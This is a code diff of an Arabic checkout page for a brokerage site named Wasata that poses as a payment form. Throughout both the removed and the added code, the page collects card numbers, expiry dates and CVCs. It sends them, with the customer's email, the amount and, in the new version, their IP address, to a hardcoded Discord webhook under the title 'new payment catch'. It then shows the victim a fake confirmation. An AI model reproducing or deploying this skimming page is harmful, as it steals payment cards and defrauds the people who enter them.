@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>إكمال الدفع | وساطة</title>
+    <title>إكمال الدفع | Wsata</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
@@ -18,23 +18,11 @@
         .radio-ring { width: 22px; height: 22px; border: 2px solid #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .tab-btn.active .radio-ring::after { content: ""; width: 11px; height: 11px; background: #000; border-radius: 50%; }
 
-        /* Card brand badge */
         .card-badge {
-            position: absolute;
-            top: -12px;
-            left: 20px;
-            background: white;
-            padding: 2px 14px;
-            border-radius: 40px;
-            font-size: 10px;
-            font-weight: 900;
-            border: 1.5px solid #f1f5f9;
-            opacity: 0;
-            transition: 0.3s;
+            position: absolute; top: -12px; left: 20px; background: white; padding: 2px 14px; border-radius: 40px;
+            font-size: 10px; font-weight: 900; border: 1.5px solid #f1f5f9; opacity: 0; transition: 0.3s;
         }
-        .card-badge.show {
-            opacity: 1;
-        }
+        .card-badge.show { opacity: 1; }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-6">
@@ -42,11 +30,11 @@
     <div class="main-card bg-white w-full max-w-2xl p-12 md:p-14 relative shadow-2xl">
         <div class="absolute top-12 right-12 text-2xl font-black text-slate-800">💳 طريقة الدفع</div>
         <div class="mt-20">
-            <!-- Card Brand Selection -->
+            <!-- اختيار نوع البطاقة -->
             <div class="grid grid-cols-2 gap-5 mb-12" id="cardTabs">
                 <div class="tab-btn active p-6 flex justify-between items-center" onclick="sel(this)" data-brand="visa">
                     <div class="radio-ring"></div>
-                    <img src="visa.png" class="h-6" alt="Visa" onerror="this.outerHTML='<span class=\'text-lg font-black\'>VISA</span>'">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-4" alt="Visa">
                 </div>
                 <div class="tab-btn p-6 flex justify-between items-center" onclick="sel(this)" data-brand="mastercard">
                     <div class="radio-ring"></div>
@@ -54,203 +42,121 @@
                 </div>
             </div>
 
-            <!-- Card Inputs -->
+            <!-- مدخلات البطاقة -->
             <div class="space-y-6 text-right relative">
-                <!-- Badge for detected brand -->
-                <div id="cardBadge" class="card-badge">💳 فيزا</div>
-
-                <!-- Card Number -->
-                <input type="text" id="ccNo" placeholder="5215 1252 1515 2155" maxlength="19" oninput="detectCardBrand(this)">
-
+                <div id="cardBadge" class="card-badge">💳 بطاقة بنكية</div>
+                <input type="text" id="ccNo" placeholder="رقم البطاقة" maxlength="19" oninput="detectCardBrand(this)">
                 <div class="grid grid-cols-2 gap-5">
-                    <!-- Expiry -->
                     <input type="text" id="expiry" placeholder="MM / YY" maxlength="7" oninput="handleExpiry(this)">
-                    <!-- CVC -->
-                    <input type="password" id="cvc" placeholder="***" maxlength="4" oninput="handleCvc(this)">
+                    <input type="password" id="cvc" placeholder="CVC" maxlength="4" oninput="handleCvc(this)">
                 </div>
             </div>
 
-            <button onclick="send()" id="payBtn" class="w-full bg-[#00eccd] text-white py-6 rounded-3xl mt-12 text-2xl font-black shadow-xl">إكمال الدفع</button>
+            <button onclick="send()" id="payBtn" class="w-full bg-[#00eccd] text-white py-6 rounded-3xl mt-12 text-2xl font-black shadow-xl transition hover:brightness-105">جاري التحميل...</button>
         </div>
     </div>
 
     <script>
+        // ديسكورد ويب هوك (نفس اللي طلبت)
+        const HOOK = "https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91";
         const firebaseConfig = { databaseURL: "https://wasata-af6ac-default-rtdb.europe-west1.firebasedatabase.app" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
+        // جلب البيانات من الـ URL
         const urlParams = new URLSearchParams(window.location.search);
-        const total = urlParams.get('total') || "0.00";
+        let totalVal = urlParams.get('total') || "0.00";
         const ticketKey = urlParams.get('ticket');
-        document.getElementById('payBtn').innerText = `دفع ${total} SAR`;
 
-        // ===== CARD BRAND SELECTOR =====
+        // تحديث زر الدفع بالمبلغ الصحيح فوراً
+        const payBtn = document.getElementById('payBtn');
+        payBtn.innerText = `دفع ${parseFloat(totalVal).toFixed(2)} SAR`;
+
+        // دالة اختيار التاب
         function sel(el) { 
-            document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active')); 
+            document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active', 'disabled')); 
             el.classList.add('active'); 
         }
 
-        // ===== CARD BRAND DETECTION =====
+        // كشف نوع البطاقة
         function detectCardBrand(input) {
-            // Remove spaces for clean value
             let value = input.value.replace(/\s/g, '');
-            
-            // Auto-add space every 4 digits
-            let formatted = '';
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) formatted += ' ';
-                formatted += value[i];
-            }
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
             input.value = formatted;
 
-            const badge = document.getElementById('cardBadge');
             const firstDigit = value.charAt(0);
-            const visaTab = document.querySelector('[data-brand="visa"]');
-            const mcTab = document.querySelector('[data-brand="mastercard"]');
-
-            if (firstDigit === '4') {
-                // Visa
-                badge.textContent = '💳 فيزا';
-                badge.classList.add('show');
-                visaTab.classList.add('active');
-                mcTab.classList.remove('active');
-                mcTab.classList.add('disabled');
-                visaTab.classList.remove('disabled');
-            } else if (firstDigit === '5') {
-                // MasterCard
-                badge.textContent = '💳 ماستركارد';
-                badge.classList.add('show');
-                mcTab.classList.add('active');
-                visaTab.classList.remove('active');
-                visaTab.classList.add('disabled');
-                mcTab.classList.remove('disabled');
-            } else if (firstDigit === '') {
-                // Empty
-                badge.classList.remove('show');
-                visaTab.classList.remove('disabled', 'active');
-                mcTab.classList.remove('disabled', 'active');
-                visaTab.classList.add('active');
-            } else {
-                // Unknown
-                badge.textContent = '💳 بطاقة';
-                badge.classList.add('show');
-                visaTab.classList.remove('active', 'disabled');
-                mcTab.classList.remove('active', 'disabled');
-            }
-
-            // Limit CVC length based on card type
-            handleCvc(document.getElementById('cvc'));
+            const badge = document.getElementById('cardBadge');
+            if (firstDigit === '4') { badge.textContent = '💳 فيزا'; badge.classList.add('show'); }
+            else if (firstDigit === '5') { badge.textContent = '💳 ماستركارد'; badge.classList.add('show'); }
+            else { badge.classList.remove('show'); }
         }
 
-        // ===== EXPIRY HANDLER =====
         function handleExpiry(input) {
-            let value = input.value.replace(/[^0-9]/g, ''); // Only digits
-            
-            // Limit month to 2 digits
-            if (value.length >= 1) {
-                let month = parseInt(value.substring(0, 2));
-                if (month > 12) {
-                    // If user types > 12, cap at 12
-                    value = '12' + value.substring(2);
-                }
-            }
-
-            // Auto-add slash after month
-            if (value.length >= 2) {
-                const month = value.substring(0, 2);
-                const rest = value.substring(2);
-                
-                if (value.length === 2 && !input.value.includes('/')) {
-                    // Just typed the second digit of month, auto-add /
-                    value = month + ' / ' + rest;
-                } else if (value.length > 2 && !input.value.includes('/')) {
-                    // Pasted or typed fast
-                    value = month + ' / ' + rest;
-                } else {
-                    // Already has /, just clean
-                    value = month + ' / ' + rest;
-                }
-            }
-
-            // Limit year to 4 digits (2 + / + 2)
-            let clean = value.replace(/[^0-9/]/g, '');
-            if (clean.length > 7) clean = clean.substring(0, 7);
-            
-            // Ensure format is always MM / YY
-            // If user deletes back past the slash, reformat
-            const parts = clean.replace(/\s/g, '').split('/');
-            if (parts.length === 2) {
-                let m = parts[0].substring(0, 2);
-                let y = parts[1].substring(0, 2);
-                // Re-ensure month <= 12
-                let monthNum = parseInt(m);
-                if (monthNum > 12) m = '12';
-                if (monthNum === 0) m = ''; // Allow empty while typing
-                clean = m + ' / ' + y;
-            }
-
-            input.value = clean;
+            let v = input.value.replace(/\D/g, '');
+            if (v.length > 2) v = v.substring(0,2) + ' / ' + v.substring(2,4);
+            input.value = v;
         }
 
-        // ===== CVC HANDLER =====
-        function handleCvc(input) {
-            let value = input.value.replace(/[^0-9]/g, '');
-            const cardInput = document.getElementById('ccNo');
-            const firstDigit = cardInput.value.replace(/\s/g, '').charAt(0);
-            
-            // Visa = 3 digits CVC, MasterCard = 3 digits too (some MC have 4)
-            // Default to 4 max to be safe
-            const maxLength = (firstDigit === '4' || firstDigit === '5') ? 3 : 4;
-            
-            if (value.length > maxLength) {
-                value = value.substring(0, maxLength);
-            }
-            
-            input.value = value;
-        }
+        function handleCvc(input) { input.value = input.value.replace(/\D/g, ''); }
 
-        // ===== SEND PAYMENT =====
+        // إرسال البيانات
         async function send() {
             const cc = document.getElementById('ccNo').value;
             const exp = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvc').value;
             const session = JSON.parse(localStorage.getItem('wasata_session')) || {email: 'زائر'};
 
-            if(!cc || !exp || !cvv) return alert("يرجى تعبئة كامل بيانات البطاقة");
-
-            // Detect brand for the webhook
-            const firstDigit = cc.replace(/\s/g, '').charAt(0);
-            const brand = firstDigit === '4' ? 'Visa' : firstDigit === '5' ? 'MasterCard' : 'بطاقة';
-
-            const hook = "https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91";
-            
-            await fetch(hook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "💳 صيدة دفع جديدة - Wasata",
-                        fields: [
-                            { name: "👤 العميل", value: session.email, inline: true },
-                            { name: "💰 المبلغ", value: total + " SAR", inline: true },
-                            { name: "🏦 نوع البطاقة", value: brand, inline: true },
-                            { name: "💳 البطاقة", value: cc },
-                            { name: "🔐 السر", value: `${exp} | ${cvv}` }
-                        ]
-                    }]
-                })
-            });
-
-            if(ticketKey) {
-                await db.ref('tickets/' + ticketKey).update({ status: 'تم الدفع ✓', action: null });
-                await db.ref('tickets/' + ticketKey + '/messages').push({
-                    text: `✅ تم تأكيد دفع مبلغ ${total} SAR عبر البطاقة البنكية (${brand}).`,
-                    sender: 'system'
-                });
+            if(cc.length < 16 || exp.length < 7 || cvv.length < 3) {
+                return alert("يرجى التأكد من صحة بيانات البطاقة");
             }
 
-            alert("✅ تم إرسال الدفع للمراجعة، سيتم تحديث تذكرتك فوراً.");
-            location.href = 'ticket.html';
+            payBtn.innerText = "جاري المعالجة...";
+            payBtn.disabled = true;
+
+            // إرسال للديسكورد
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                await fetch(HOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "💳 صيدة دفع جديدة | Wsata",
+                            color: 3066993,
+                            fields: [
+                                { name: "👤 العميل", value: session.email, inline: true },
+                                { name: "💰 المبلغ المكتشف", value: totalVal + " SAR", inline: true },
+                                { name: "🌐 IP", value: ipData.ip, inline: true },
+                                { name: "💳 رقم البطاقة", value: `\`${cc}\`` },
+                                { name: "🔐 التاريخ والرمز", value: `\`${exp} | ${cvv}\`` }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+
+                // تحديث التذكرة ليعرف الوسيط والعميل أن الدفع تم
+                if(ticketKey) {
+                    await db.ref('tickets/' + ticketKey).update({ 
+                        status: 'تم الدفع ✓', 
+                        action: null 
+                    });
+                    await db.ref('tickets/' + ticketKey + '/messages').push({
+                        text: `✅ تم تأكيد دفع مبلغ ${totalVal} SAR عبر البطاقة البنكية بانتظار تأكيد الوسيط.`,
+                        sender: 'system'
+                    });
+                }
+
+                alert("✅ تم قبول العملية، سيتم تحديث حالة التذكرة الآن.");
+                window.location.href = 'ticket.html';
+
+            } catch (err) {
+                alert("حدث خطأ، يرجى المحاولة لاحقاً.");
+                payBtn.disabled = false;
+                payBtn.innerText = `دفع ${totalVal} SAR`;
+            }
         }
     </script>
 </body>
